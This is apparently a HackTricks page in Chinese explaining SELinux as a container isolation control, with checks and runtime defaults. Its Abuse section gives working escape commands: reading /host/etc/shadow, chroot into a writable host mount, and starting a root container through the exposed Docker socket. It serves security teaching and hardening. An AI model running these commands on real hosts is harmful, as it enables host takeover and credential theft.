# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

SELinux 是一种**基于标签的强制访问控制**系统。每个相关进程和对象都可能携带安全上下文，策略决定哪些 domain 可以与哪些 type 交互，以及可以执行何种操作。在容器化环境中，这通常意味着 runtime 会在受限的容器 domain 下启动容器进程，并使用对应的 type 为容器内容设置标签。如果策略正常工作，即使某些主机内容通过 mount 变得可见，进程也可能只能读写其标签预期允许访问的内容，而会被拒绝访问其他主机内容。

这是主流 Linux 容器部署中最强大的主机侧保护机制之一。在 Fedora、RHEL、CentOS Stream、OpenShift 以及其他以 SELinux 为核心的生态系统中尤其重要。在这些环境中，忽略 SELinux 的审查人员通常会误判：某个看似明显的主机 compromise 路径实际上为何会被阻断。

## AppArmor Vs SELinux

高层次上最容易理解的区别是：AppArmor 基于路径，而 SELinux **基于标签**。这会对容器安全产生重大影响。如果相同的主机内容通过意外的 mount 路径变得可见，基于路径的策略可能会表现不同。而基于标签的策略则会检查对象的标签，以及进程 domain 可以对其执行哪些操作。这并不意味着 SELinux 简单，但它确实能够抵御一类路径 trick 假设；在基于 AppArmor 的系统中，防御者有时会意外地依赖这类假设。

由于其模型以标签为核心，容器 volume 的处理和重新设置标签的决策对安全至关重要。如果 runtime 或操作员为了“让 mounts 正常工作”而过度修改标签，那么原本用于隔离 workload 的策略边界可能会比预期弱得多。

## 实验

要确认主机上是否启用了 SELinux：
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
检查主机上现有的 labels：
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
比较正常运行与禁用标记时：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
在启用 SELinux 的主机上，这是一个非常实用的演示，因为它展示了在预期的容器域下运行的 workload，与被移除该 enforcement layer 的 workload 之间的差异。

## Runtime 使用

在 SELinux 属于平台默认组件的系统上，Podman 与 SELinux 的配合尤其出色。Rootless Podman 加上 SELinux 是主流容器基线中最强的方案之一，因为该进程在主机侧本身就是 unprivileged 的，同时仍受到 MAC policy 的约束。在受支持的环境中，Docker 也可以使用 SELinux，不过管理员有时会为了绕过 volume-labeling 带来的麻烦而将其禁用。CRI-O 和 OpenShift 高度依赖 SELinux，将其作为容器隔离方案的重要组成部分。Kubernetes 也可以提供与 SELinux 相关的设置，但这些设置的价值显然取决于节点 OS 是否实际支持并强制执行 SELinux。

其中反复出现的经验是：SELinux 不是可有可无的装饰。在围绕它构建的生态系统中，它属于预期的 security boundary。

## Misconfigurations

最经典的错误是 `label=disable`。在实际运维中，这通常是因为 volume mount 被拒绝，而最快的短期解决办法是移除 SELinux 的影响，而不是修复 labeling model。另一个常见错误是错误地对 host content 进行 relabeling。宽泛的 relabel 操作可能会让应用正常运行，但也可能将容器允许访问的范围扩大到远超原本预期的程度。

同样重要的是，不要将 **已安装** 的 SELinux 与 **实际生效** 的 SELinux 混为一谈。主机可能支持 SELinux，但仍处于 permissive mode；或者 runtime 可能没有在预期的 domain 下启动 workload。在这些情况下，保护强度会远低于文档所暗示的程度。

## Abuse

当 SELinux 对 workload 不存在、处于 permissive 状态，或被广泛禁用时，host-mounted paths 会更容易被 abuse。原本会受到 labels 约束的 bind mount，可能会变成直接访问 host data 或修改 host 的途径。当这种情况与 writable volume mounts、container runtime directories，或为方便而暴露敏感 host paths 的 operational shortcuts 结合时，风险尤其明显。

SELinux 经常可以解释：为什么 generic breakout writeup 在一台主机上能够立即奏效，但在另一台主机上即使 runtime flags 看起来相似，却反复失败。缺失的因素往往根本不是 namespace 或 capability，而是仍然完整存在的 label boundary。

最快的实际检查方法是比较 active context，然后探测通常会受到 label 约束的 mounted host paths 或 runtime directories：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
如果存在主机 bind mount，且 SELinux labeling 已被禁用或弱化，通常首先发生的是信息泄露：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
如果该 mount 可写，且从 kernel 的角度来看 container 实际上拥有 host-root 权限，下一步应测试受控的 host 修改，而不是靠猜测：
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
在支持 SELinux 的主机上，运行时状态目录周围的标签丢失也可能暴露直接的权限提升路径：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
这些命令不能替代完整的 escape chain，但它们可以非常快速地确认：究竟是不是 SELinux 阻止了对 host 数据的访问或对 host 侧文件的修改。

### Full Example: SELinux Disabled + Writable Host Mount

如果禁用了 SELinux labeling，并且 host filesystem 以可写方式挂载到 `/host`，那么完整的 host escape 就会变成普通的 bind-mount abuse case：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果 `chroot` 成功，容器进程现在将从主机文件系统中运行：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完整示例：SELinux 已禁用 + Runtime 目录

如果 workload 在 labels 被禁用后可以访问 runtime socket，则可以将 escape 委托给 runtime：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
关键观察点在于，SELinux 往往正是阻止此类 host-path 或 runtime-state 访问的控制机制。

## 检查

SELinux 检查的目标是确认 SELinux 已启用，识别当前的 security context，并查看你关注的文件或路径是否确实受到 label 限制。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
这里有哪些值得关注的地方：

- `getenforce` 理想情况下应返回 `Enforcing`；`Permissive` 或 `Disabled` 会改变整个 SELinux 章节的含义。
- 如果当前进程上下文看起来异常或权限范围过宽，说明该 workload 可能没有运行在预期的 container policy 下。
- 如果 host-mounted files 或 runtime directories 的标签允许进程过于自由地访问，那么 bind mounts 会变得更加危险。

在支持 SELinux 的平台上检查 container 时，不要将 labeling 视为次要细节。在许多情况下，labeling 正是 host 尚未被 compromise 的主要原因之一。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation 可用于启用了 SELinux 的 host，但具体行为取决于 host/daemon configuration | `--security-opt label=disable`、对 bind mounts 进行宽泛的 relabeling、`--privileged` |
| Podman | 在 SELinux host 上通常启用 | 在 SELinux 系统上，SELinux separation 通常是 Podman 的正常组成部分，除非被禁用 | `--security-opt label=disable`、`containers.conf` 中的 `label=false`、`--privileged` |
| Kubernetes | 通常不会在 Pod 级别自动分配 | SELinux support 存在，但 Pod 通常需要 `securityContext.seLinuxOptions` 或 platform-specific defaults；同时还需要 runtime 和 node support | 宽松或范围过大的 `seLinuxOptions`、在 permissive/disabled node 上运行、会禁用 labeling 的 platform policies |
| CRI-O / OpenShift style deployments | 通常高度依赖 | 在这些环境中，SELinux 通常是 node isolation model 的核心组成部分 | 过度扩大访问范围的 custom policies、为兼容性而禁用 labeling |

SELinux defaults 比 seccomp defaults 更依赖 distribution。在 Fedora/RHEL/OpenShift-style 系统上，SELinux 通常是 isolation model 的核心。在非 SELinux 系统上，它则完全不存在。
{{#include ../../../../banners/hacktricks-training.md}}
